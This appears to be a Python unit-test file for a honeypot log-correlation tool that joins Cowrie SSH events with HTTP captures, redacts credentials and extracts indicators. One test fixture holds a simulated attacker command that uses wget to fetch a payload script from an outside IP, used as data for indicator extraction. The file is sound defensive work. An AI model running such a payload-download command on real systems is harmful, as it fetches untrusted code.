import argparse
import contextlib
import io
import json
from pathlib import Path
import tempfile
import unittest
import sys
sys.path.insert(0,str(Path(__file__).resolve().parents[1]))
from honeypot import Store
from trace import snapshot, timestamp


class TraceTests(unittest.TestCase):
    def setUp(self):
        self.temp=tempfile.TemporaryDirectory()
        self.root=Path(self.temp.name)
        self.logs=self.root/'cowrie/log/cowrie'
        self.logs.mkdir(parents=True)
        self.args=argparse.Namespace(http=str(self.root/'http'),cowrie=str(self.root/'cowrie'),
            ip=None,session=None,since=None,limit=100,max_log_bytes=100000,max_files=8,
            indicators=True,show_credentials=False)
        with contextlib.redirect_stdout(io.StringIO()):
            store=Store(self.root/'http',1000000)
            store.save(b'GET / HTTP/1.1\r\n\r\n',{'method':'GET','target':'/index.php','complete':True},['198.51.100.7',50000],['127.0.0.1',8080])
            store.db.close()

    def tearDown(self):
        self.temp.cleanup()

    def write(self, events):
        (self.logs/'cowrie.json').write_text(''.join(json.dumps(e)+'\n' for e in events))

    def event(self,eventid,**extra):
        return {'timestamp':'2026-10-21T19:00:00Z','session':'testsession','eventid':eventid,**extra}

    def test_correlate_and_extract(self):
        self.write([self.event('cowrie.session.connect',src_ip='198.51.100.7'),
            self.event('cowrie.login.success',username='root',password='decoy'),
            self.event('cowrie.command.input',input='wget http://203.0.113.5/payload.sh')])
        self.args.ip='198.51.100.7'
        r=snapshot(self.args)
        self.assertEqual(r['protocols'],{'ssh':3,'http':1})
        self.assertEqual(r['events'][1]['details']['password'],'[redacted]')
        self.assertTrue(any(i['value']=='http://203.0.113.5/payload.sh' for i in r['indicators']))
        self.assertTrue(r['events'][1]['source_inferred_from_session'])

    def test_credentials_explicit(self):
        self.write([self.event('cowrie.login.success',password='decoy')])
        self.args.show_credentials=True
        r=snapshot(self.args)
        self.assertEqual(r['events'][0]['details']['password'],'decoy')

    def test_unknown_ip_never_borrowed(self):
        self.write([self.event('cowrie.command.input',input='id')])
        self.args.ip='198.51.100.7'
        self.assertEqual(snapshot(self.args)['protocols'],{'http':1})

    def test_missing_sources_partial(self):
        self.args.http=str(self.root/'missing')
        self.assertEqual(snapshot(self.args)['coverage'],'partial')

    def test_bad_and_partial_lines(self):
        (self.logs/'cowrie.json').write_bytes(b'bad\n{"partial":')
        r=snapshot(self.args)
        self.assertEqual(r['coverage'],'partial')
        self.assertEqual(r['event_count'],1)

    def test_bounded_tail(self):
        self.write([self.event('cowrie.command.input',input='x'*200),self.event('cowrie.command.input',input='id')])
        self.args.max_log_bytes=150
        self.assertTrue(any('bounded tail' in w for w in snapshot(self.args)['warnings']))

    def test_session_filter(self):
        self.write([self.event('cowrie.command.input',input='id')])
        self.args.session='testsession'
        self.assertEqual(snapshot(self.args)['event_count'],1)

    def test_conflicting_session_sources_not_inferred(self):
        self.write([self.event('cowrie.session.connect',src_ip='198.51.100.7'),
                    self.event('cowrie.session.connect',src_ip='198.51.100.8'),
                    self.event('cowrie.command.input',input='id')])
        command=next(e for e in snapshot(self.args)['events'] if e['event']=='cowrie.command.input')
        self.assertIsNone(command['src_ip'])
        self.assertTrue(command['source_conflict'])

    def test_invalid_session_schema_skipped(self):
        self.write([self.event('cowrie.command.input',session=[],input='id')])
        report=snapshot(self.args)
        self.assertEqual(report['protocols'],{'http':1})
        self.assertEqual(report['coverage'],'partial')

    def test_event_retention_reports_coverage(self):
        self.write([self.event('cowrie.command.input',input='id') for _ in range(5)])
        self.args.limit=2
        report=snapshot(self.args)
        self.assertLessEqual(report['event_count'],2)
        self.assertTrue(any('limit' in w for w in report['warnings']))

    def test_requires_aware_time(self):
        with self.assertRaises(ValueError):timestamp('2026-10-21T19:00:00')
        self.assertEqual(timestamp('2026-10-21T12:00:00-07:00'),'2026-10-21T19:00:00+00:00')


if __name__=='__main__':unittest.main()
